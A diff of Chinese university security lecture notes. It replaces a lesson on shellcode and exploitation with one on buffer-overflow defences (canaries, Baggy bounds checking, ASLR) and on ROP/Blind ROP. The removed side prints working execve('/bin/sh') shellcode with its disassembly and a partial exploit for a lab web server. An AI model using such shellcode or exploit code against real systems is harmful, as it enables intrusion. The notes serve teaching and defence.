@@ -1,448 +1,519 @@
-#缓冲区溢出3：Shellcode与漏洞利用
-
+缓冲区溢出：攻防对抗
+===
 ###哈尔滨工业大学 网络与信息安全 张宇 2016
 
 参考课程: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm) 
 
 ---
 
-本节课学习shellcode原理，并利用漏洞在服务器上运行shellcode，以及return-to-libc攻击。
+本节学习缓冲区溢出攻击的防御方案与新型攻击技术，重点介绍一种边界检查机制Baggy，以及一种破解地址空间布局随机化的攻击技术BROP。
 
-##Shellcode原理
+##避免攻击
 
-参考资料：[Smashing The Stack For Fun And Profit](supplyments/Smashing-The-Stack-For-Fun-And-Profit.pdf) [[online]](http://phrack.org/issues/49/14.html#article)
+回顾缓冲区溢出攻击要点：
 
-利用缓冲区溢出漏洞改写函数返回地址来劫持程序控制流，令其指向预执行代码。通常该代码会启动一个shell，称作"shellcode"。
+1. **较长输入**通过缓冲区溢出来**改写栈中数据**
+- **改写指令指针**劫持控制流
+- 执行后注入或已存在**恶意指令**
 
-下面是一个C语言程序启动shell的例子。
+避免缓冲区溢出，来从源头上杜绝**较长输入**通过缓冲区溢出来**改写栈中数据**。
+
+###对策1：避免C代码中bug
+
+仔细检查缓冲区，字符串，队列大小。使用带有缓冲区大小参数的函数，例如用`strncpy()`替代`strcpy()`，用`fgets()`替代`gets()`。新版本编译器会对程序中bug进行警告，不应忽略这个警告。
+
+- 优点：从源头上避免问题！
+- 缺点：难以保证代码没有bug，特别是代码库很大时。应用也可能自己定义除了`fgets()`或`strcpy()`之外的缓冲区操作函数。
+
+###对策2：Bug检测工具
+
+可分为静态检测和动态检测。考虑如下代码：
 
 ``` c
-#include <stdio.h>void main() {   char *name[2];   name[0] = "/bin/sh";   name[1] = NULL;
-   /* int execve(const char *filename, char *const argv[],
-          char *const envp[]);   */   execve(name[0], name, NULL);
-   exit(0);}
+void foo(int *p){     int offset;     int *z = p + offset;     if(offset > 7){          bar(offset);     }}
 ```
 
-`execve()`在父进程中fork一个子进程，在子进程中调用`exec()`函数启动新的程序。`exec`系列函数中`execve()`为内核级系统调用。 `execve()`执行第一个参数`filename`字符串所指文件，第二个参数是利用数组指针来传递命令行参数(第一个元素是命令本身)，并且要以空指针`null`结束，最后一个参数则为传递给执行文件的新环境变量数组。
+静态检测在不运行代码的情况下进行。例如，我们很容易发现`offset`在未被初始化的情况下使用，而且传播到`bar()`函数中。代价较小，但准确性不足。
 
-Linux的`execve()`通过寄存器传递参数，由0x80软中断触发`syscall()`调用，过程如下：
+动态检测在代码运行时进行。例如，[模糊测试（fuzzing）](https://en.wikipedia.org/wiki/Fuzz_testing)自动或半自动地生成随机数据输入到一个程序中，并监视程序异常。[宽松边界检查（Baggy Bounds Checking）](https://www.usenix.org/legacy/events/sec09/tech/full_papers/akritidis.pdf)有效地在运行时检测缓冲区边界是否正确。
 
-1. 内存中存在`null`结尾字符串`"/bin/sh"`
-1. 内存中存在`"/bin/sh"的地址`后加一个`null long word`1. 拷贝`execve`调用编号(`0xb`)到`eax`1. 拷贝`"/bin/sh"的地址`到`ebx`1. 拷贝`"/bin/sh"的地址的地址`到`ecx`1. 拷贝`null long word的地址`到`edx`1. 执行`int $0x80`调用`syscall()`
+- 优点：能够显著减少bug。
+- 缺点：难以保证完全没有bug。
 
-若`execve()`调用失败，程序将继续执行，很可能导致崩溃。为在调用失败后仍然可以正常退出，在`execve()`之后添加`exit(0)`：
+###对策3：使用内存安全语言
 
-1. 拷贝`exit`调用号(`0x1`)到`exa`
-2. 拷贝`0x0`到`exb`
-3. 执行`int $0x80`调用`syscall()`
+例如JavaScript，C#，Python。
 
-在shellcode中，多处需要用到地址，一个问题是事先并不知道代码和字符串会被放置在哪里。
+- 优点：通过不暴露原始内存地址以及自动垃圾回收来阻止内存错误。
+- 缺点：
+	- 底层运行态代码仍然使用原始内存地址，因此运行时核心程序不能有bug。例如[堆喷射(heap spraying)攻击](https://en.wikipedia.org/wiki/Heap_spraying)通过分配较大缓冲区来在特定位置写入数据。
+	- 存在大量非安全语言代码（FORTRAN，COBOL）
+	- 需要访问底层硬件功能，例如写设备驱动
+	- 性能比C程序差很多？
+		- 曾经是一个大问题，但情况越来越好，例如[JIT(即时编译)](https://en.wikipedia.org/wiki/Just-in-time_compilation)技术，和只比c慢2倍的[asm.js](https://en.wikipedia.org/wiki/Asm.js)
+		- 仔细编码避免在关键流程中频繁地垃圾收集扰动
+		- 选择正确的工具。避免用C来写文本处理程序
 
-解决该问题的一种方法是用`jmp`和`call`指令，通过指令指针相对寻址来跳到特定位置，而不需要事先知道准确地址。
-
-首先，在通过改写返回地址来跳转到shellcode后，利用`jmp`指令跳转到`call`指令。将`call`指令放在`"/bin/sh"`字符串之前，当执行`call`指令时，字符串地址将被入栈，作为`call`被执行时的返回地址。`call`指令只需简单的跳转到`jmp`之后的代码，执行`pop`指令将栈中的`call`的返回地址，即字符串地址，拷贝到一个寄存器使用。
-
-下面是程序描述与跳转示意图：
-
-1. 返回地址跳转到shellcode（跳转1）
-2. `jmp`跳转到`call`（跳转2）
-1. `pop`获得`"/bin/sh"地址`
-1. 执行`execv()`
-1. 执行`exit()`
-1. `call`跳转到`pop`（跳转3）
-1. 字符串`"/bin/sh"`
-
-```
-low address         <———— stack growth ————              high address
-                      
-          +—————————(3)—————————+
-          V                     | 
-   [jmp][pop][execve()][exit()][call]["/bin/sh"][sfp][ret][arguments]
-   ^  |                          ^                    |
-   |  +—————————(2)——————————————+                    |
-   +——————————————————————————————————(1)—————————————+  
-
-```
-
-通常shellcode将被作为字符串注入缓冲区中。由于空字节(null)会被认为是字符串结尾，因此需要将其中的空字节去掉。一种主要手段是用`xorl %eax,%eax`指令来令`eax`寄存器为`0`，用`eax`作为参数，从而避免在参数中直接使用`0`。另外，shellcode越小越好。
-
-在实验中提供了3个文件：
-
-- `shellcode.S`：shellcode汇编代码
-- `shellcode.bin`：编译后二进制代码
-- `run-shellcode`：直接运行`shellcode.bin`
-
-查看完整的shellcode代码`shellcode.S`：
-
-``` gas
-#include <sys/syscall.h>                /* 系统调用编号表 */
-
-#define STRING  "/bin/sh"               /* 执行命令字符串 */
-#define STRLEN  7                       /* 字符串长度 */
-#define ARGV    (STRLEN+1)              /* execve()参数2相对偏移量 */
-#define ENVP    (ARGV+4)                /* execve()参数3相对偏移量 */
-                                        /* argv末尾元素和envp复用同一地址 */
-.globl main                             /* 令符号main对ld和其他程序可见 */
-        .type   main, @function         /* 设置符号main的类型为函数 */
-
- main:
-        jmp     calladdr                /* 跳转(2)到call */
-
- popladdr:
-        popl    %esi                    /* 将string地址出栈写入esi */
-        movl    %esi,(ARGV)(%esi)       /* 将string地址写入argv */
-        xorl    %eax,%eax               /* 获得32位的0 */
-        movb    %al,(STRLEN)(%esi)      /* 将string结尾字节置0 */
-        movl    %eax,(ENVP)(%esi)       /* 将envp置0 */
-                                        /* argv末尾元素和envp复用同一0 */
-        movb    $SYS_execve,%al         /* syscall参数1: syscall编号 */
-        movl    %esi,%ebx               /* syscall参数2: string地址 */
-        leal    ARGV(%esi),%ecx         /* syscall参数3: argv地址 */
-        leal    ENVP(%esi),%edx         /* syscall参数4: envp地址 */
-        int     $0x80                   /* 调用syscall */
-
-        xorl    %ebx,%ebx               /* syscall参数2: 0 */
-        movl    %ebx,%eax               /* 将eax置0 */
-        inc     %eax                    /* syscall参数1: SYS_exit (1) */
-                                        /* 用mov+inc来避免空字节 */
-        int     $0x80                   /* 调用syscall */
-
- calladdr:
-        call    popladdr                /* 将下一指令(string)地址入栈后跳转 */
-        .ascii  STRING                  /* 将字符串(不追加0)存入连续地址 */
-```
-
-下列命令用于编译，提取，反编译，执行shellcode：
-
-- 编译：`gcc -m32 -c -o shellcode.bin shellcode.S`
-- 提取二进制指令：`objcopy -S -O binary -j .text shellcode.bin`
-- 反编译：`objdump -D -b binary -mi386 shellcode.bin`
-- 执行：`./run-shellcode shellcode.bin`
-
-下面是反编译的结果：
-
-``` gas
-$ objdump -D -b binary -mi386 shellcode.bin
-
-shellcode.bin:     file format binary
-Disassembly of section .data:
-
-00000000 <.data>:
-   0:   eb 1f                   jmp    0x21
-   2:   5e                      pop    %esi
-   3:   89 76 08                mov    %esi,0x8(%esi)
-   6:   31 c0                   xor    %eax,%eax
-   8:   88 46 07                mov    %al,0x7(%esi)
-   b:   89 46 0c                mov    %eax,0xc(%esi)
-   e:   b0 0b                   mov    $0xb,%al
-  10:   89 f3                   mov    %esi,%ebx
-  12:   8d 4e 08                lea    0x8(%esi),%ecx
-  15:   8d 56 0c                lea    0xc(%esi),%edx
-  18:   cd 80                   int    $0x80
-  1a:   31 db                   xor    %ebx,%ebx
-  1c:   89 d8                   mov    %ebx,%eax
-  1e:   40                      inc    %eax
-  1f:   cd 80                   int    $0x80
-  21:   e8 dc ff ff ff          call   0x2
-  26:   2f                      das                       # /bin/sh
-  27:   62 69 6e                bound  %ebp,0x6e(%ecx)
-  2a:   2f                      das
-  2b:   73 68                   jae    0x95
-```
-
-运行上述shellcode可以启动一个新shell：
-
-``` sh
-$ ./run-shellcode shellcode.bin
-$ 
-```
 ---
 
-##代码注入
+##缓解攻击
 
-利用之前的漏洞将shellcode注入到web服务器并启动shell。回顾之前的漏洞触发过程：
+当缓冲区溢出发生时，阻止攻击者进行以下步骤：
 
-(1) 构造"过长的"客户端请求，并发送请求到服务器。
+- **改写代码指针**劫持控制流，例如返回地址，函数指针，C++ vtable， 异常处理句柄
+- 在内存中后注入或已存在**恶意代码**
+- 将恶意代码安置在**可预测位置**，令代码指针指向该位置
 
-``` python
-def build_exploit(shellcode):
-	req =   "GET /" + 'A' * 1024 + " HTTP/1.0\r\n" + \
-   		     "\r\n"
-	return req
+
+###对策1：金丝雀（canaries）[[参考](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries)]
+
+在被改写的代码指针被调用之前发现它。其思想是编译器在程序中安放canary变量，并检测canary变量是否被改写。类似用金丝雀在煤矿中检测一氧化碳。此类工作包括[StackGuard](https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf)和[GCC的SSP（Stack Smashing Protector）]()。
+
+在函数入栈时安放一个canary，返回前检查该canary。通常需要有源码，编译器插入canary检查。
+
+- 问：canary应该在栈中什么位置？
+- 答：canary必须在返回地址之前(更低地址)，任何改写返回地址的溢出也会改写canary。
+
+```+——————————————————+|  return address  |    ^+——————————————————+    ||    saved %ebp    |    |+——————————————————+    ||     CANARY       |    | +——————————————————+    | | buf[127]         |    ||       ...        |    ||           buf[0] |
++——————————————————+ 
 ```
 
-(2) 服务器端`zookd`处理请求并转发给`zookfs`。处理请求的代码在`http.c`中，其中存在缓冲区溢出漏洞。
+一个C程序例子：
 
 ``` c
-zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
-
-zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
-
-```
-`http_serve()`函数中`strcat()`触发缓冲区溢出漏洞导致`handler`变量被改写，在执行`(*handler)()`函数时导致程序崩溃。
-
-``` c
-void http_serve(int fd, const char *name)
+void foo(const char* str)
 {
-    void (*handler)(int, const char *) = http_serve_none;
-    char pn[1024];
-    struct stat st;
-
-    getcwd(pn, sizeof(pn));
-    setenv("DOCUMENT_ROOT", pn, 1);
-
-    strcat(pn, name);
-    split_path(pn);
-
-    /* ...代码有删节... */
-    
-    handler(fd, pn);
+	char buffer[16];
+	strcpy(buffer, str);
 }
 ```
 
-`http_serve()`的栈结构：
+SSP自动将上述代码转化：
+
+``` c
+extern uintptr_t __stack_chk_guard;
+noreturn void __stack_chk_fail(void);
+void foo(const char* str)
+{
+	uintptr_t canary = __stack_chk_guard;
+	char buffer[16];
+	strcpy(buffer, str);
+	if ( (canary = canary ^ __stack_chk_guard) != 0 )
+		__stack_chk_fail();
+}
+```
+
+- 问：编译器用4字节`'a'`作为canary如何？
+- 答：攻击者可以在缓冲中用相同canary。
+
+因此，canary必须难以猜测，或即使被猜出也能抵抗攻击。
+	
+- “终止符canary”：四个字节 `0, CR, LF, -1`。C函数将这些字符作为终止符。若canary匹配这些终止符之一，则攻击者也必须在此写入终止符，令canary后面的内容无法被改写。
+- 随机canary是更常用方法，但需要很好的随机化！还需要对canary进行保密，并防止攻击者从内存中读取canary。
+
+
+然而，canary不能发现在canary之前的函数指针被改写。例如，
+
+- 攻击者改写数据指针，利用该指针对任意内存改写，而不需连续改写缓冲区
+
+```c
+int *ptr = ...;char buf[128];gets(buf);  //Buffer is overflowed, and overwrites ptr.*ptr = 5;   //Writes to an attacker-controlled address!            //Canaries can't stop this kind of thing.
 
 ```
-+———————————————————————-+   
-|          name          |<——— (+12)   =0xbfffde14       
-+———————————————————————-+   
-|        fd = 3          |<——— (+8)    =0xbfffde10                                  
-+———————————————————————-+                                 
-|     return address     |<——— (+4)    =0xbfffde0c 
-+———————————————————————-+                             
-|          ebp           |<——— (0)     =0xbfffde08
-+———————————————————————-+
-|                        |
+
+- 堆对象溢出（函数指针，C++ vtables）
+- malloc/free溢出可以改写指定地址上数据，详见[Exploiting the heap](http://www.win.tue.nl/~aeb/linux/hh/hh-11.html)。考虑下面一个C程序。
+
+```c
+int main(int argc, char **argv) {     char *p, *q;     p = malloc(1024);     q = malloc(1024);
+     
+     if(argc >= 2)          strcpy(p, argv[1]);     free(q);     free(p);     return 0;}
+```
+`malloc()`在每个被分配内存块头部创建一个`size/status`结构体。假设`p`和`q`所分配的内存块相邻，堆结构如下：
+
+```
++——————————————————+
+| size + status    |            |
++——————————————————+ <—————— p  |
+|   .. data ..     |            |
++——————————————————+            |
+| size + status    |            |
++——————————————————+ <—————— q  |
+|   .. data ..     |            v
++——————————————————+
+```
+若`p`被`argv[1]`溢出将改写`q`内存块结构体中`size`值。
+
+`free()`更改`status`来"释放"内存，在块结尾创建一个`size/status`记录，并创建空闲块结构体，包括指向前继和后继空闲块结构体的指针。因此，一个块最小16字节。
+
+```
++——————————————————+
+|  size + status   |<—— update   ^
++——————————————————+             |
+|  forward ptr     |——————————+  |
++——————————————————+          |  |
+|  backward ptr    |—————————————+
++——————————————————+          |
+|   .. free ..     |          |
++——————————————————+          v
+|  size + status   |<—— create
++——————————————————+
+
+```
+`free()`合并相邻空闲块时，需要根据`size`来获取结构体指针，并更新前继和后继空闲块结构体中指针内容。错误的`size`值将导致某个指针所指向内容被改写！
+
+``` c
+ptr = get_free_block_struct(size);bck = ptr->bk;fwd = ptr->fd;fwd->bk = bck;   //Writes memory!bck->fd = fwd;   //Writes memory!
+```
+
+###对策2：边界检查（bounds checking）
+
+C语言中难以区分有效指针和无效指针，例如下代码中的`ptr`。
+
+```c
+union u{    int i;    struct s{        int j;        int k;}; };int *ptr = &(u.s.k);
+```
+
+原因在于C语言中，指针本身不包含使用语义。因此，有许多工具并不试图猜测语义，而只是保证堆和栈中对象的内存边界，这被称为“边界检查”。基于编译器实现，在运行时检查指针是否合理范围之内。尽管不能保证指针一定被正确使用，但能确保程序一定在已分配的内存中操作。这被认为是C语言世界中的一大进步！
+
+####电子围栏（electric fences）:
+
+思想：每个堆对象分配一整个内存页，对象之后的页内空间（guard page）标记为不可访问，若访问则导致故障
+
+- 优点：不需要源代码，不需要改变编译器或重编译程序！但需要重新链接到实现了电子围栏的malloc库
+- 缺点：内存消耗巨大！每个页中只有一个对象，而且还有一个不用使用的哑页。也不能保护栈。
+
+####胖指针（fat pointer）:
+
+思想：更改指针表达，令其包含所指向对象在内存中的边界信息。
+
+```
+            Regular 32-bit pointer               +——————————————+               |   address    |               +——————————————+             Fat pointer (96 bits)+——————————————+——————————————+——————————————+|   obj_base   |   obj_end    | curr_address |+——————————————+——————————————+——————————————+
+```
+
+```c
+int *ptr = malloc(sizeof(int) * 2);while(1){     *ptr = 42;    <———      ptr++;                       
+}                                
+```
+
+第3行代码将检查指针当前地址并确保其在界内。因此，当循环到第3次时会发生故障。问题是每次解引用都检查代价太大！而且胖指针与许多存在的程序都不兼容，不能用在固定大小结构中，指针更新也不再是原子操作。
+
+后面会详细介绍一种边界检查方案：Baggy。
+
+###对策3：不可执行内存
+
+硬件支持对内存读、写、执行的权限说明。例如，AMD的NX位，Intel的XD位，Windows DEP（Data Execution Prevention），Linux的Pax。可将栈标记为不可执行。一些系统强制“W^X”，即可写和可执行不能同时存在，但也不支持动态生成代码（同时需要写和执行）。详见[可执行空间保护](https://en.wikipedia.org/wiki/Executable_space_protection)。
+
+###对策4：随机化内存地址
+
+许多攻击需要在shellcode中编入地址。这些地址通过gdb等工具获得。因此，可通过地址随机化令攻击者难以猜测地址。
+
+**栈随机化**：将栈移动到随机位置，或在栈中变量之间随机填充。攻击者难以猜测返回地址的位置，以及shellcode将会被插入到哪里。
+
+**[ASLR (Address Space Layout Randmization)](https://en.wikipedia.org/wiki/Address_space_layout_randomization)**：随机布置栈，堆，动态库。动态链接器为每个库选择随机位置，攻击者难以找到`system()`位置。但也存在以下问题：
+
+- 在32位机器上，可随机比特不够大（1比特用于区分内核/用户模式，12比特用于内存映射页与页边界对齐），攻击者可能蛮力猜测位置。
+- 攻击者利用`usleep()`函数，该函数可能位置有2^16个或2^28个。猜测`usleep(16)`地址并写入返回地址，观察程序是否挂起了16秒。
+- 程序产生栈trace或错误消息包含指针。
+- 攻击者利用“Heap spraying”将shellcode填满内存，很可能随机跳到shellcode。
+
+
+**实践中缓冲区溢出防御**：
+
+- gcc和MSVC缺省启用金丝雀
+- Linux和Windows缺省包含ASLR和NX
+- 界限检查不太常用，因为：性能代价，需重编译，误报。有时，有些漏报但零误报 好于 零漏报但有些误报
+
+---
+
+##Baggy Bounds Checking
+
+阅读资料：[Baggy Bounds Checking (2009)](supplyments/baggy-bound-checking-USENIX2009.pdf) [[online]](https://www.usenix.org/legacy/events/sec09/tech/full_papers/akritidis.pdf)
+
+思想：为每个分配的对象，通过malloc或编译器来确定对象大小，并把对象大小记录下来。在两种指针操作中，检查指针是否出界：
+
+- 指针算术：`char *q = p + 256;`
+- 指针解引用：`char ch = *q;`
+
+检查解引用操作的原因：无效指针并不意味着错误！不合理但无害！
+
+- 模拟从1开始的数组(1-indexed array) 
+- 预计算`p+(a-b)`时，计算`(p+a)-b` 
+- 出界指针随后检查是有效的
+
+检查算术操作的原因：用来追踪指针的来源，设置OOB(Out-Of-Bound)位。没有OOB位，无法知道一个派生的指针是否出界。
+
+挑战1：如何确定一个普通指针的边界？
+
+- 简单方案1：用哈希表或间隔树来实现地址到边界的映射
+	- 优点：节省空间，只存储被使用的指针
+	- 缺点：查询较慢，每次查询需多次访问内存
+
+- 简单方案2：用一个队列存储每个内存地址的边界信息
+	- 优点：速度快
+	- 缺点：占用内存太大
+
+挑战2：如何令出界指针的解引用产生故障？
+
+- 简单方案1：检查每一个指针解引用
+	- 优点：可行
+	- 缺点：代价高，每个解引用都需要执行额外代码
+
+为克服上述问题，Baggy实现了有效的内存分配与边界检查，主要包括5点技巧：
+
+1. 按2的幂划分内存空间，分配的起点与2的幂对齐
+- 将范围上界表示为log_2(分配大小)。对于32位指针，只需5比特来表示其范围上界。
+- 将范围上界存储在一个线性数组中：每个元素1字节，实现快速查询。可用虚拟内存来按需分配数组。所有元素初始值为31，内存释放后恢复为31。
+- 按一定粒度(slot)分配内存（例如16字节）：上界数组更短
+- 利用虚拟内存系统（硬件实现）来处理出界解引用错误：将出界指针的最高有效位（OOB位）置1，并令地址空间上半部分的页标记为不可访问，于是不必为指针解引用做检查！
+
+示例：
+
+内存分配例子：slot大小为16字节，`table`数组中每个元素对应1个slot。
+
+```c
+slot_size = 16;p = malloc(16);     table[p/slot_size] = 4;  // 1 slotq = malloc(20);     table[p/slot_size] = 5;  // 2 slots
+                    table[(p/slot_size)+1] = 5;
+```
+假设首块空闲内存有64字节，则内存分配过程如下：
+
+```        
+              memory               bounds table
+     +—————+—————+—————+—————+    +——+——+——+——+
+Step |                       |    |31|31|31|31|
+ 0   +—————+—————+—————+—————+    +——+——+——+——+
+     0     16    32          64
+
+     +—————+—————+—————+—————+    +——+——+——+——+
+Step |  p  |     |           |    | 4|31|31|31|
+ 1   +—————+—————+—————+—————+    +——+——+——+——+
+     0     16    32          64
+
+     +—————+—————+—————+—————+    +——+——+——+——+
+Step |  p  |     |     q     |    | 4|31| 5| 5|
+ 2   +—————+—————+—————+—————+    +——+——+——+——+
+     0     16    32          64
+     
+```
+
+分配空间要大于Object大小，多余空间可能被写入数据，但这并不会影响其他Object。为了避免从多余空间读入之前写入恶意数据，多余空间内容会被清除。
+
+检查派生指针是否出界：
+
+```c
+q = p + i;
+```
+先获取`p`所在内存块信息，后对`q`进行边界检查：
+
+``` c
+size = 1 << table[p >> log_of_slot_size]; 
+base = p & ~(size - 1); (q >= base) && ((q - base) < size) 
+```
+对上面边界检查优化：
+
+``` c
+(p^q) >> table[p >> log_of_slot_size] == 0
+```
+
+C语言中有一些情况需要使用出界指针，例如用`p-1`模拟下标从1开始的数组，用`p+sizeof(p)`表示buffer结尾。支持这类指针需要两个功能：
+
+- 将指针标记为出界：将出界指针的最高有效位置1
+- 该指针上操作的出界检查：用slot大小的一半作为上下界，这样可以判断出一个OOB指针是在Object之上还是Object之下。通过增加或减少一个slot大小，能够找到该指针对应的Object，从而知道界限范围。
+
+```      
+     |<———slot——>|             |<———slot——>|    
+—————+—————+—————+—————~ ~—————+—————+—————+—————
+     |     | half|   object    | half|     |
+—————+—————+—————+—————~ ~—————+—————+—————+—————
+```
+
+对下面代码做出界检查，分析见注释。
+
+```c
+char *p = malloc(18);
+
+//            memory                    table
+//   +—————+—————+—————+—————+    +———+———+———+———+
+//   |  p        |           |    | 5 | 5 |   |   |
+//   +—————+—————+—————+—————+    +———+———+———+———+
+//   0     16    32          64
+
+char *q = p + 24;  // OK: 24 > 18, but < 32
+
+char *r = q + 17;  // ERROR: (41-32)=9 > (8=16/2)
+
+char *s = q + 9;   // set 's' OOB-bit: 33-32=1 < (8=16/2)
+
+char *t = s - 10;  // unset 't' OOB-bit: 23 < 32
+
+```
+
+下面代码会引发异常吗？
+
+``` c
+char *p = malloc(32);char *q = p + 32;char ch = *q;```
+- 第1行：32字节slot大小整数倍，且为2的幂，因此分配空间为32字节，无空闲空间。
+- 第2行：`q`由于越界，OOB位被置1，但在slot大小一半之内，未引发错误。
+- 第3行：解引用时OOB位=1相当于访问内存空间禁止访问的上半部分，引发故障。
+
+---
+
+##Blind Return-Oriented Programming
+
+阅读资料：[Hacking Blind (2014)](supplyments/blind-return-oriented-programming.pdf) [[Slides]](blind-return-oriented-programming-slides.pdf) [[online]](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)
+
+假设目标系统实现了DEP和ASLR，那么缓冲区溢出攻击还能实施吗？如目标系统只实现了DEP而没有实现ASLR，可实施ROP攻击。若也实现了ASLR，则可实施BROP攻击。
+
+###ROP [(Blackhat08)](http://cseweb.ucsd.edu/~hovav/talks/blackhat08.html)
+
+之前我们已经学习过Return-to-libc攻击，该攻击通过改写返回值，调用了libc中函数，绕过不可执行栈防御。ROP是一连串利用函数返回来操纵控制流的技术。例如，攻击者打算多次重复调用某个libc函数`func(char * str)`。首先，需要3个地址：
+
+- 函数`func()`的地址
+- 参数`str`的地址
+- `pop/ret`操作地址：
+	- `pop %eax`: 弹出栈顶到`eax`
+	- `ret`: 弹出栈顶到`eip`
+
+上面的`pop/ret`操作片段称作一个“gadget”（小装置），是在已经存在的二进制文件中的有用片段，后面还会需要其他gadget。
+
+然后，利用溢出改写返回地址，并在栈中伪造函数调用帧：
+
+```
 +————————————————————————+
-|    void (*handler)     |<——— (-12)   =0xbfffddfc
+|          (5)           | addr of str ————+ Fake calling
++————————————————————————+                 | frame for
+|          (4)           | addr of pop/ret—+ func()
++————————————————————————+ 
+|          (3)           | addr of func()
 +————————————————————————+
-|pn[1023]   ^            |
+|          (2)           | addr of str ————+ Fake calling
++————————————————————————+                 | frame for
+|          (1)           | addr of pop/ret—+ func()
++————————————————————————+
+|    return address      | addr of func()
++————————————————————————+
+|      saved %ebp        |<——— new %ebp
++————————————————————————+
+|buff[1023] ^            |
 |           |            |
-|           |       pn[0]|<——— (-1036) =0xbfffd9fc
+|           |     buff[0]|<——— new %esp
 +————————————————————————+
-|    struct stat st      | 
-|       (88bytes)        |<——— (-1124) =0xbfffd9a4
-+———————————————————————-+
+
+```
+当函数返回后，程序流程如下：
+
+1. 返回地址（被改写为`func()`地址）出栈到`eip`，`esp`—>(1)
+2. `func()`从`esp+4`—>(2)中读取参数地址，执行直到返回
+3. `func()`中`ret`将栈顶，即`esp`—>(1)`pop/ret`地址，出栈到`eip`，此时`esp`—>(2)
+4. `pop/ret`执行：(2)被弹出栈，`esp`—>(3)；`ret`执行弹出栈顶（3)`func()`地址到`$eip`，此时`esp`—>(4)
+5. `func()`从`esp+4`—>(5)中读取参数地址，执行直到返回
+
+###Blind ROP：
+
+若采用了ASLR，则地址被随机化难以实现ROP。Blind ROP（BROP）能够在源代码未知、随机地址未知的条件下实施攻击。
+
+BROP攻击分为三个阶段：
+
+1. 读栈术（stack reading）：攻破Canary和ASLR
+2. BROP：寻找足够的gadget来调用`write()`
+3. 用`write()`获取二进制数据来寻找足够的gadget构造shellcode
+
+####第一阶段：读栈术
+
+许多服务程序崩溃后自动重启，而每次重启时地址随机化结果是一致的，例如，Linux的[PIE（Position-independent executable）](https://en.wikipedia.org/wiki/Position-independent_code#PIE)机制，用`fork()`来产生新服务进程，而不是`execve()`。由于`fork()`拷贝父进程地址空间，尽管地址布局未知，但每次子进程重启后地址布局都是相同的。
+
+向栈中敏感位置写入一个字节的猜测值，观察服务器状态：
+
+- 未崩溃：猜测正确
+- 崩溃：猜测错误
+
+一旦猜测正确，记录已经猜出的值，继续猜测新位置的值。以此读取canary和返回地址等敏感信息。
+
+####第二阶段：BROP
+
+**第1步： 寻找一个stop gadget**
+
+stop gadget是一个指向令程序停止代码（例如`sleep()`）的返回地址，但不会导致程序崩溃。
+
+寻找方法是将返回地址改写为猜测地址，观察客户端网络连接是否突然关闭：
+
+- 连接关闭：猜测的地址不是stop gadget
+- 连接保持：找到了一个stop gadget
+
+**第2步： 寻找pop gadget**
+
+一旦有了stop gadget，可寻找`pop`到不同寄存器的pop gadget，即`pop %X; ret;`。3个地址：
+
+- probe: 猜测的pop gadget地址
+- stop: 已找到的stop gadget地址
+- crash: 不可执行代码（`0x0`）地址
+
+利用ROP寻找pop gadget过程：
+
+- 返回地址改为probe地址，后面跟着crash地址和stop地址
+	- 若连接保持，则找到了pop gadget（需确认不是另一个stop）
+	- 否则，则遇到了crash
+
+
+```
+                        +->sleep(5)<-++——— pop eax        ^   |            ||    ret            |   |            ||     \———>[stop]   |  0x5....       0x5.... 
+|          [crash]  |  0x0           0x0    <—————————————————+
++——————————[probe]  |  0x4...8       0x4...c -->xor eax, eax  |                    |                           ret           |
+                                                   \__________|
+```
+
+此时，攻击者找到了一些pop gadget，但不知道其中所使用的寄存器，也不知道`syscall`指令的地址。
+
+**第3步： 寻找syscall()并确定pop gadget所用寄存器**
+
+`pause()`系统调用无需参数。为了找到`pause()`，攻击者将所有pop gadget连在一起形成一个ROP链，将`pause()`的系统调用号入栈作为每个gadget的参数。在链底部放入所猜测的`syscall`地址，如下图：
+
+```
++————————————————————————+
+|                        | guessed addr of syscall()
++————————————————————————+
+~                        ~ ...
++————————————————————————+ 
+|                        | syscall number of pause
++————————————————————————+
+|                        | addr of pop rdi; ret // Gadget 2
++————————————————————————+
+|                        | syscall number of pause
++————————————————————————+
+|    return address      | addr of pop rdi; ret // Gadget 1
++————————————————————————+
+|      saved %ebp        |<——— new %ebp
++————————————————————————+
+|buff[1023] ^            |
+|           |            |
+|           |     buff[0]|<——— new %esp
++————————————————————————+
 
 ```
 
-攻击手段是构造一个请求令`pn`缓冲区溢出，从而改写`handler`指针，令其指向shellcode。
+这会将`pause()`调用号存入寄存器中。若其中有`exa`，而且`syscall()`猜测正确的话，则服务器会暂停。此时，就找到了`syscall()`地址。接着，用每个pop gadget单独重复这一过程，就能找到使用了`exa`的gadget。利用这一方法，还可以确定其他寄存器对应的gadget。
 
-```  
-        bottom of the stack                               
-+————————————————————+———————————+——————————————————————+
-|  void (*handler)   |  ^        | address of shellcode |———+
-+————————————————————+  |        +——————————————————————+   |      
-|pn[1023]   ^        |  |        |    'AAA'...'AAA'     |   |
-|           |        |  |        +——————————————————————+   |
-|           |        |  | name[0]|      shellcode       |<——+
-|           |        +———————————+——————————————————————+
-|           |   pn[0]|   getwd   |  "/home/httpd/lab/"  |
-+————————————————————+———————————+——————————————————————+<——0xbfffd9fc
+- 第4步：调用`write()`
 
+用之前的方法找到以下gadget，用ROP实现`write()`调用。
+
+``` gaspop edi; ret (socket)pop esi; ret (buffer)pop edx; ret (length)pop eax; ret (write syscall number)
+syscall
 ```
-以此构造请求需要计算两个值：
+####第三阶段：构造shellcode
 
-- 填充'A'的个数：`1024-len("/home/httpd/lab/")-len(shellcode)`
-- shellcode在栈中地址：`0xbfffd9fc + len("/home/httpd/lab/")`
+至此，攻击者利用BROP来攻击web服务器，通过`write()`将服务器数据和代码地址作为参数，将敏感内容写入与攻击者客户端相连的socket，发送给攻击者。攻击者由此发现更多的gadget来构造shellcode。
 
-``` python
-stack_buffer = 0xbfffd9fc
+####防御Blind BROP
 
-def build_exploit(shellcode):
-    ## Things that you might find useful in constructing your exploit:
-    ##   urllib.quote(s)
-    ##     returns string s with "special" characters percent-encoded
-    ##   struct.pack("<I", x)
-    ##     returns the 4-byte binary encoding of the 32-bit integer x
-    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
+每次服务崩溃重新随机化canary和地址空间！
 
